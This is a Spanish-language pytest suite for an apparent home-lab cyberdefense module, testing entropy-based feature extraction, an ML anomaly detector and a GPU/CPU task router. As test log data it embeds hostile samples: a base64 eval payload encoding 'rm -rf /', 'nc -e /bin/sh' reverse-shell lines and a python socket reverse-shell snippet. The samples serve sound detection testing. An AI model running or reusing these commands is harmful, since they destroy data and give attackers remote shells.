"""
Suite de pruebas unitarias automatizadas para el módulo de Ciberdefensa y Enrutador de Tareas.
"""

import pytest
import time
from cyberdefense.ml_detector import (
    SecurityLogEntry,
    ExtractedFeatures,
    FeatureExtractor,
    MLAnomalyDetector,
    AnomalyDetectionResult,
)
from cyberdefense.task_router import (
    TaskRouter,
    TaskType,
    TaskWorkload,
    ClusterNode,
    TaskAssignment,
)
from cyberdefense.pipeline import CyberDefensePipeline, PipelineResult


def test_feature_extractor_shannon_entropy():
    # Entropía de cadena vacía es 0
    assert FeatureExtractor.calculate_shannon_entropy("") == 0.0

    # Entropía de caracteres repetidos es 0
    assert FeatureExtractor.calculate_shannon_entropy("aaaaaa") == 0.0

    # Cadena con alta entropía (ofuscada / aleatoria)
    high_entropy_str = "eval(base64_decode('aW1wb3J0IG9zO29zLnN5c3RlbSgncm0gLXJmIC8nKQ=='))"
    entropy = FeatureExtractor.calculate_shannon_entropy(high_entropy_str)
    assert entropy > 4.0


def test_feature_extraction_from_logs():
    extractor = FeatureExtractor()
    now = time.time()
    entries = [
        SecurityLogEntry("192.168.1.50", "192.168.1.105", 80, "GET /index.html", now),
        SecurityLogEntry("192.168.1.50", "192.168.1.105", 443, "GET /api/v1/health", now + 1),
        SecurityLogEntry("192.168.1.50", "192.168.1.105", 22, "SSH-2.0-OpenSSH_8.9p1", now + 2),
    ]

    features = extractor.extract(entries, time_window_seconds=10.0)
    assert features.total_requests == 3
    assert features.unique_ports == 3
    assert features.port_ratio == 1.0  # 3 puertos / 3 peticiones
    assert features.request_frequency == 0.3  # 3 req / 10s
    assert features.command_entropy > 0.0


def test_ml_anomaly_detector_normal_traffic():
    detector = MLAnomalyDetector()
    now = time.time()
    entries = [
        SecurityLogEntry("192.168.1.10", "192.168.1.108", 80, "GET /status", now),
        SecurityLogEntry("192.168.1.10", "192.168.1.108", 80, "GET /metrics", now + 2),
    ]

    result = detector.detect(entries, time_window_seconds=60.0, environment="Ubuntu 26")
    assert not result.is_anomaly
    assert result.risk_level in ("LOW", "MEDIUM")
    assert len(result.reasons) == 0


def test_ml_anomaly_detector_port_scan_and_high_entropy():
    detector = MLAnomalyDetector(freq_threshold=2.0, port_ratio_threshold=0.4, entropy_threshold=3.5)
    now = time.time()

    # Generar 10 peticiones a 10 puertos diferentes con payload ofuscado (escaneo Nmap/Kali)
    entries = [
        SecurityLogEntry(
            "192.168.1.200",
            "192.168.1.105",
            1000 + i,
            f"NC -e /bin/sh 192.168.1.200 {8000 + i} payload_x86_64_encoded_x{i*999}",
            now + (i * 0.1),
        )
        for i in range(10)
    ]

    result = detector.detect(entries, time_window_seconds=2.0, environment="Kali")
    assert result.is_anomaly
    assert result.risk_level in ("HIGH", "CRITICAL")
    assert any("frecuencia" in r.lower() or "puertos" in r.lower() or "entropía" in r.lower() for r in result.reasons)


def test_task_router_gpu_and_cpu_assignments():
    router = TaskRouter()

    # Tarea LLM_INFERENCE -> Debería ir al Nodo Titán (192.168.1.105, RTX 5060 Ti)
    gpu_task = router.route("t-1", TaskWorkload.LLM_INFERENCE)
    assert gpu_task.task_type == TaskType.GPU_ACCELERATED
    assert gpu_task.assigned_node.ip_address == "192.168.1.105"
    assert "RTX 5060 Ti" in gpu_task.assigned_node.hardware

    # Tarea COMPUTER_VISION -> Debería ir al Nodo Titán
    cv_task = router.route("t-2", TaskWorkload.COMPUTER_VISION)
    assert cv_task.assigned_node.ip_address == "192.168.1.105"

    # Tarea DENSE_EMBEDDINGS -> Debería ir al Nodo Titán
    emb_task = router.route("t-3", TaskWorkload.DENSE_EMBEDDINGS)
    assert emb_task.assigned_node.ip_address == "192.168.1.105"

    # Tarea LOG_FILTERING -> Debería ir a la Laptop Zen (192.168.1.108, Ryzen 5)
    cpu_task1 = router.route("t-4", TaskWorkload.LOG_FILTERING)
    assert cpu_task1.task_type == TaskType.CPU_DISTRIBUTED
    assert cpu_task1.assigned_node.ip_address == "192.168.1.108"
    assert "Ryzen 5" in cpu_task1.assigned_node.hardware

    # Tarea RAG_PARSING -> Debería ir a Laptop Zen
    cpu_task2 = router.route("t-5", TaskWorkload.RAG_PARSING)
    assert cpu_task2.assigned_node.ip_address == "192.168.1.108"

    # Tarea TELEMETRY -> Debería ir a Laptop Zen
    cpu_task3 = router.route("t-6", TaskWorkload.TELEMETRY)
    assert cpu_task3.assigned_node.ip_address == "192.168.1.108"


def test_cyberdefense_pipeline_execution():
    pipeline = CyberDefensePipeline()
    now = time.time()

    # Simular peticiones maliciosas desde Kali Linux / Metasploitable2
    malicious_logs = [
        SecurityLogEntry(
            "192.168.1.99",
            "192.168.1.105",
            p,
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.99\",{p}))'",
            now + i * 0.05,
        )
        for i, p in enumerate([21, 22, 80, 443, 3306, 5432, 8080, 9000, 27017, 6379])
    ]

    result = pipeline.run_integrated_cycle(security_entries=malicious_logs, environment="Kali")

    assert result.telemetry_summary is not None
    assert result.security_analysis is not None
    assert result.security_analysis.is_anomaly
    assert len(result.routed_tasks) >= 2

    # Verificar que las tareas fueron enrutadas correctamente a Titán (GPU) y Laptop Zen (CPU)
    titan_tasks = [t for t in result.routed_tasks if t.assigned_node.ip_address == "192.168.1.105"]
    zen_tasks = [t for t in result.routed_tasks if t.assigned_node.ip_address == "192.168.1.108"]

    assert len(titan_tasks) > 0  # Tarea de Inferencia IA desencadenada por anomalía
    assert len(zen_tasks) > 0    # Tareas de filtrado de logs y telemetría
